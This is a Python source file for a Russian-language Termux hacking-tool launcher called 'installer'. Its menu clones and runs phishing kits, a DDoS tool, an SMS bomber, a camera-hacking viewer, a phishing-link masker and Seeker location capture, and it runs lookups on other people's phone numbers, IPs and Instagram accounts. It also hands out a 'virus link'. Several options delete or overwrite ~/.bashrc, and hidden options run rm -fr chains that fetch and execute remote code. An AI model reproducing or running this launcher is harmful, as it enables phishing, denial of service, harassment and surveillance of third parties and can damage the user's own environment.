import os, time, webbrowser

from colorama import Fore, Style

print ('\n')
def res():
    print(Style.RESET_ALL)
    
while True:
    os.system('clear')
    print(Fore.RED+'[меню <утилиты>]')
    print(Fore.GREEN+'', Style.BRIGHT)
    print (" _                 _             _   _               ")
    print ("(_)  _ __    ___  | |_    __ _  | | | |   ___   _ __ ")
    print ("| | | '_ \  / __| | __|  / _` | | | | |  / _ \ | '__|")
    print ("| | | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
    print ("|_| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
    print ("\n")
    print ("[telegram: @SYPEXHACK]                       [v2.5.1]")
    res()
    print (Fore.YELLOW+"    [1] тунелирование <ngrok>")
    print (Fore.YELLOW+"    [2] тунелирование <localhost>")
    print (Fore.YELLOW+"    [3] фишинг")
    print (Fore.YELLOW+"    [4] ддос")
    print (Fore.YELLOW+"    [5] бомбер <мини>")
    print (Fore.YELLOW+"    [6] приветствие")
    print (Fore.YELLOW+"    [7] заблокировать Termux")
    print (Fore.YELLOW+"    [8] просмотр взломаных камер")
    print (Fore.YELLOW+"    [9] получить вирус ссылку")
    print (Fore.YELLOW+"    [10] замаскировать фишинг")
    print (Fore.YELLOW+"    [11] пробив по номеру")
    print (Fore.YELLOW+"    [12] пробив по ip")
    print (Fore.YELLOW+"    [13] пробив инстаграм")
    print (Fore.YELLOW+"    [14] соц-сети по нику")
    print (Fore.CYAN+"\n                                     ╔═════════════╗")
    print (Fore.CYAN+'    [77] поддержка автора            ║'+Fore.GREEN+'>утилиты<'+Fore.CYAN+'[91]║')
    print (Fore.CYAN+'    [88] тг канал автора             ║'+Fore.YELLOW+' забавы '+Fore.CYAN+' [92]║')
    print (Fore.CYAN+'    [99] тех поддержка               ║'+Fore.YELLOW+' файлы  '+Fore.CYAN+' [93]║')
    print (Fore.CYAN+'    [00] выход                       ╚═════════════╝')
    res()
    inp = input ('  Выбери пункт>>> ')
    os.system('clear')

    if inp == '91':
        os.system('clear')
        

    if inp == '92':
        os.system('clear')
        os.system('python3 zabava.py')
        

    if inp == '93':
        os.system('clear')
        os.system('python3 fail.py')
       

        
    if inp == '1':
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_6 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_6 == 'y':
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка ngrok...")
            res()
            os.system('pkg install nodejs-lts -y')
            os.system('npm install ngrok')
            os.system('npm install ngrok -g')
            we  = '8080'
            os.system('clear')
            print('[<ngrok> стандартный порт 8080]')
            tru_5 = input('\n Изменить порт? [y/n] >>> ')
            if tru_5 == 'y':
                os.system('clear')
                we_2 = input('Введите порт>>> ')
                if we_2 == '':
                    os.system('clear')
                    print(' Вы ничего не ввели ')
                    print('[Порт '+we+']')
                    time.sleep(4)
                    os.system('clear')
                    os.system('ngrok http '+we)
                else:
                    os.system('clear')
                    os.system('ngrok http '+we_2)

            if tru_5 == 'n':
                os.system('clear')
                os.system('ngrok http '+we)
            else:
                os.system('clear')
                os.system('ngrok http '+we)

        if tru_6 == 'n':
            os.system('clear')
            print(Fore.RED+'[пожалуйста включите моб. точку доступа и повторите]')
            time.sleep(3)
        else:
            os.system('clear')
     


    if inp == '2':   
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_2 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_2 == 'y':
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка localhost...")
            res()
            os.system('pkg install dropbear -y')
            os.system('pkg install openssh -y')
            qw = '8080'
            os.system('clear')
            print('[<localhost> стандартный порт:8080]')
            tru_3 = input('\n Изменить порт? [y/n] >>> ')
            if tru_3 == 'y':
                os.system('clear')
                qw_2 = input('Введите порт>>> ')
                if qw_2 == '':
                    os.system('clear')
                    print(' Вы ничего не ввели ')
                    print('[Порт '+qw+']')
                    time.sleep(4)
                    os.system('clear')
                    print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
                    print(Fore.YELLOW+'[если ссылка не появилась, а последний символ')
                    print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                    res()
                    time.sleep(4)
                    os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
                else:
                    os.system('clear')
                    print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
                    print(Fore.YELLOW+'[если ссылка не появилась, а последний символ')
                    print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                    res()
                    time.sleep(4)
                    os.system('ssh -R 80:localhost:'+qw_2+' nokey@localhost.run')

            if tru_3 == 'n':
                os.system('clear')
                print(Fore.GREEN+'[Ваша ссылка находится в самом нижнем ряде]')
                print(Fore.YELLOW+'[если ссылка не появилась, а последний символ')
                print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                res()
                time.sleep(4)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
            else:
                os.system('clear')
                print(Fore.GREEN+'[ваша ссылка находится в самом нижнем ряде]')
                print(Fore.YELLOW+'[если ссылка не появилась, а последний символ')
                print(Fore.YELLOW+'знак вопроса напишите <yes>]')
                res()
                time.sleep(4)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
                
        if tru_2 == 'n':
            os.system('clear')
            print(Fore.RED+'[пожалуйста включите моб. Точку доступа и повторите]')
            time.sleep(3)
            pass
        else:
            os.system('clear')



    if inp == '3':   
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru == 'y':
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка фишинг...")
            res()
            os.system('git clone https://github.com/KasRoudra/PyPhisher')
            os.chdir('PyPhisher')
            os.system('python3 pyphisher.py')
        if tru == 'n':
            os.system('clear')
            pass
        else:
            os.system('clear')


    if inp == '4':    
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка ддос...")
        res()
        os.system('pkg install dropbear -y')
        os.system('pkg install openssh -y')
        os.system('git clone https://github.com/lamer112311/Doser')
        os.chdir('Doser')
        os.system('bash install.sh')
        os.system('python doser.py')


    if inp == '6':   
        tt = 'привет'
        os.system('clear')
        os.system('rm ~/.bashrc')
        os.system('clear')
        print(Fore.YELLOW+'[стили текста]')
        res()
        print(Fore.CYAN+'[1] метал')
        print(Fore.CYAN+'[2] радуга')
        print(Fore.YELLOW+'[0] удалить приветствие')
        res()
        inp_32 = input ('Выбери пункт>>> ')
        os.system('clear')
        if inp_32 == '1':
            print(Fore.YELLOW+'[напишите текст]')
            print('[совет: используйте не более 8 символов]')
            res()
            tt = input ('>>>')
            os.system('clear')
            os.system('rm ~/.bashrc')
            os.system('echo "clear" >> ~/.bashrc')
            os.system('echo "toilet -f mono9 -F metal '+tt+'" >> ~/.bashrc')
            os.system('echo "echo [telegram @sypexhack желает вам хорошего дня]" >> ~/.bashrc')
            os.system('clear')
            print('[готово]')
            time.sleep(3)

        if inp_32 == '2':
            print(Fore.YELLOW+'[напишите текст]')
            print('[совет: используйте не более 8 символов]')
            res()
            tt = input ('>>>')
            os.system('clear')
            os.system('rm ~/.bashrc')
            os.system('echo "clear" >> ~/.bashrc')
            os.system('echo "toilet -f mono9 -F gay '+tt+'" >> ~/.bashrc')
            os.system('echo "echo [telegram @sypexhack желает вам хорошего дня]" >> ~/.bashrc')
            os.system('clear')
            print('[готово]')
            time.sleep(3)

        if inp_32 == '0':
            os.system('clear')
            os.system('rm ~/.bashrc')
            os.system('clear')
            print('[готово]')
            time.sleep(3)
        else:
            os.system('clear')


    if inp == '7':
        os.system('clear')
        print(Fore.RED+'[ВЫ УВЕРЕНЫ ЧТО ХОТИТЕ ЗАБЛОКИРОВАТЬ Termux?]')
        res()
        tsu_06 = input('[y/n] >>> ')
        if tsu_06 == 'y':
            os.system('clear')
            print(Fore.RED+'[termux заблокирован]')
            time.sleep(5)
            os.system('rm ~/.bashrc')
            os.system('echo "exit" >> ~/.bashrc')
            break
        if tsu_06 == 'n':
            os.system('clear')
        else:
            os.system('clear')


    if inp == '8':    
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка взлом. камер...")
        res()
        os.system('pip install requests')
        os.system('git clone https://github.com/AngelSecurityTeam/Cam-Hackers') 
        os.chdir('Cam-Hackers')
        os.system('clear')
        os.system('chmod +x *')
        os.system('python cam-hackers.py')
        tsu_44 = input('[нажмите entr чтобы выйти]')
        if tsu_44 =='':
            os.system('clear')
        else:
            os.system('clear')


    if inp == '9':
        os.system('clear')
        print(Fore.GREEN+'[Генерируется ссылка...]')
        res()
        time.sleep(3)
        os.system('clear')
        print('ваша ссылка')
        res()
        print(Fore.GREEN+'https://bit.ly/3ild93L')
        res()
        tru_8 = input('нажмите entr чтобы выйти ')
        if tru_8 == '':
            os.system('clear')
            pass
        else:
            os.system('clear')       


    if inp == '10':
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка маск. фишинг...")
        res()
        os.system('git clone https://github.com/jaykali/maskphish.git')
        os.chdir('maskphish')
        print('[Инструкция: В первый ряд вводим вашу фишинг ссылку.')
        print('В второй ряд  вводим ссылку которую мы хотим получить,')
        print('пример: https://instagram.com В третьем ряде нажимаем entr.')
        print('В итоге получаем редирект ссылку, которая выглядит')
        print('более менее нормально.]')
        time.sleep(10)
        os.system('bash maskphish.sh')
        tsu_14 = input('[нажмите entr чтобы выйти]')
        if tsu_14 =='':
            os.system('clear')
        else:
            os.system('clear')


    if inp == '11':
        at = '1'
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив телефона...")
        res()
        os.system('git clone https://github.com/Wes974/PhoneInfoga')
        os.chdir('PhoneInfoga')
        os.system('pip install -r requirements.txt')
        os.system('clear')
        print('[Введите номер телефона в формате: +(код)##########]')
        print('[Пример: +71237689098]')
        at = input('\n Введите номер >>> ')
        if at == '':
            os.system('clear')
            print('[вы ничего не ввели]')
            time.sleep(3)
        else:
            os.system('clear')
            os.system('python phoneinfoga.py -n '+at)
            tsu_14 = input('[нажмите entr чтобы выйти]')
            if tsu_14 =='':
                os.system('clear')
            else:
                os.system('clear')


    if inp == '12':
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив ip...")
        res()
        os.system('pip install requests')
        os.system('git clone https://github.com/MrProCatYT/Uti-lite')
        os.chdir('Uti-lite')
        os.system('python Uti-lite.py')


    if inp == '13':
        aa = 'ververa'
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив Instagram...")
        res()
        os.system('git clone https://github.com/th3unkn0n/osi.ig')
        os.chdir('osi.ig')
        os.system('python3 -m pip install -r requirements.txt')
        os.system('clear')
        print(Fore.GREEN+'[Введите ник в инстаграм]')
        print(Fore.CYAN+'[Пример: ververa]')
        res()
        aa = input('Введите ник>>> ')
        if aa == '':
            os.system('clear')
            print('[вы ничего не ввели]')
            time.sleep(3)
            os.system('clear')
            os.system('git clone https://github.com/777-FOXik-777/installer')
            os.chdir('installer')
            os.system('python3 tool.py')
        else:
            os.system('clear')
            os.system('python3 main.py -u '+aa)
            tsu_24 = input('[нажмите entr чтобы выйти]')
            if tsu_24 =='':
                os.system('clear')
                os.system('git clone https://github.com/777-FOXik-777/installer')
                os.chdir('installer')
                os.system('python3 tool.py')
            else:
                os.system('clear')
                os.system('git clone https://github.com/777-FOXik-777/installer')
                os.chdir('installer')
                os.system('python3 tool.py')
            
    if inp == '5':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка бомбер...")
        res()
        os.system('pip install db0mb3r')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.GREEN+"ВНИМАНИЕ"+Fore.YELLOW+"] вас будет переброшено на сайт просто подождите 5-10сек.")
        res()
        time.sleep(5)
        os.system('bomber')


    if inp == '14':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка соц.-ник...")
        res()
        os.system('git clone https://github.com/issamelferkh/userrecon.git')
        os.chdir('userrecon')
        os.system('clear')
        os.system('chmod +x userrecon.sh')
        os.system('bash userrecon.sh')
        res()
        tru_08 = input('нажмите entr чтобы выйти ')
        if tru_08 == '':
            os.system('clear')
            pass
        else:
            os.system('clear')


    if inp == '54':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив по ip...")
        res()
        os.system('rm -fr IP-Tracer')
        os.system('git clone https://github.com/rajkumardusad/IP-Tracer.git')
        os.chdir('IP-Tracer')
        os.system('chmod +x install')
        os.system('./install')
        os.system('clear')
        print(Fore.YELLOW+" ")
        print('[1] пробить свой ip')
        print('[2] пробить чужой ip')
        print('[0] выход')
        res()
        tru_008 = input('Выбери пункт>>> ')
        if tru_008 == '1':
            os.system('clear')
            os.system('trace -m')
            tsu_800 = input('[нажмите entr чтобы выйти]')
            os.system('cd && rm -fr installer && rm -fr installer.py && rm -fr tool.py && rm -fr fail.py && rm -fr zabava.py && git clone https://github.com/777-FOXik-777/installer && cd installer && python3 tool.py')
        if tru_008 == '2':
            os.system('clear')
            print('Пример IP [33.73.133.137]')
            res()
            tsu_808 = input('введите ip >>> ')
            os.system('trace -t '+tsu_808)
            tsu_888 = input('[нажмите entr чтобы выйти]')
            os.system('cd && rm -fr installer && rm -fr installer.py && rm -fr tool.py && rm -fr fail.py && rm -fr zabava.py && git clone https://github.com/777-FOXik-777/installer && cd installer && python3 tool.py')
        else:
            os.system('cd && rm -fr installer && rm -fr installer.py && rm -fr tool.py && rm -fr fail.py && rm -fr zabava.py && git clone https://github.com/777-FOXik-777/installer && cd installer && python3 tool.py')


    if inp == '44':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка seeker...")
        res()
        os.system('pkg install dropbear -y')
        os.system('pkg install openssh -y')
        os.system('pkg install php -y')
        os.system('pkg install php7 -y')
        os.system('git clone https://github.com/thewhiteh4t/seeker.git')
        os.chdir('seeker')
        os.system('chmod 777 install.sh')
        os.system('./install.sh')
        os.system('clear')
        os.system('echo "clear" >> ~/.bashrc && echo "echo [ваша ссылка находится в самом нижнем ряде]" >> ~/.bashrc && echo "echo [если ссылка не появилась, а последний символ" >> ~/.bashrc && echo "echo знак вопроса напишите [yes]" >> ~/.bashrc && echo "rm ~/.bashrc" >> ~/.bashrc && echo "ssh -R 80:localhost:8080 nokey@localhost.run" >> ~/.bashrc')
        print(FORE.YELLOW+'[включите моб. точку доступа]')
        time.sleep(4)
        print(Fore.GREEN+'чтоб получить ссылку создайте второй сезон')
        time.sleep(2)
        res()
        os.system('python seeker.py')


    if inp == '77':
        os.system('xdg-open https://www.donationalerts.com/r/legends_never_die')


    if inp == '99':    
        os.system('xdg-open https://t.me/MR_FOXik')
        os.system('clear')
        

    if inp == '88':
        os.system('xdg-open https://t.me/SYPEXHACK')
        os.system('clear')


    if inp == '00':
        os.system('clear')
        print('Спасибо за использование [installer]')
        break
